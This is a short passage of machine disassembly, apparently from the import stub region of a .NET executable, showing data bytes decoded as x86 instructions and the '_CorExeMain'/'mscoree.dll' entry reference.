  408c47:	0e                   	push   %cs
  408c48:	0e                   	push   %cs
  408c49:	08 12                	or     %dl,(%edx)
  408c4b:	51                   	push   %ecx
  408c4c:	12 51 12             	adc    0x12(%ecx),%dl
  408c4f:	51                   	push   %ecx
  408c50:	12 51 06             	adc    0x6(%ecx),%dl
  408c53:	00 02                	add    %al,(%edx)
  408c55:	01 12                	add    %edx,(%edx)
  408c57:	51                   	push   %ecx
  408c58:	08 06                	or     %al,(%esi)
  408c5a:	00 01                	add    %al,(%ecx)
  408c5c:	11 58 11             	adc    %ebx,0x11(%eax)
  408c5f:	58                   	pop    %eax
  408c60:	04 00                	add    $0x0,%al
  408c62:	00 11                	add    %dl,(%ecx)
  408c64:	58                   	pop    %eax
  408c65:	03 06                	add    (%esi),%eax
  408c67:	11 58 04             	adc    %ebx,0x4(%eax)
  408c6a:	02 00                	add    (%eax),%al
  408c6c:	00 00                	add    %al,(%eax)
  408c6e:	04 00                	add    $0x0,%al
  408c70:	00 00                	add    %al,(%eax)
  408c72:	80 00 9c             	addb   $0x9c,(%eax)
  408c75:	8c 00                	mov    %es,(%eax)
	...
  408c7f:	00 be 8c 00 00 00    	add    %bh,0x8c(%esi)
  408c85:	20 00                	and    %al,(%eax)
	...
  408c9b:	00 b0 8c 00 00 00    	add    %dh,0x8c(%eax)
	...
  408cb1:	00 5f 43             	add    %bl,0x43(%edi)
  408cb4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb5:	72 45                	jb     0x408cfc
  408cb7:	78 65                	js     0x408d1e
  408cb9:	4d                   	dec    %ebp
  408cba:	61                   	popa
  408cbb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  408cc2:	72 65                	jb     0x408d29
  408cc4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  408cc8:	6c                   	insb   (%dx),%es:(%edi)
  408cc9:	00 00                	add    %al,(%eax)
  408ccb:	00 00                	add    %al,(%eax)
  408ccd:	00 ff                	add    %bh,%bh
  408ccf:	25 00 20 40 00       	and    $0x402000,%eax
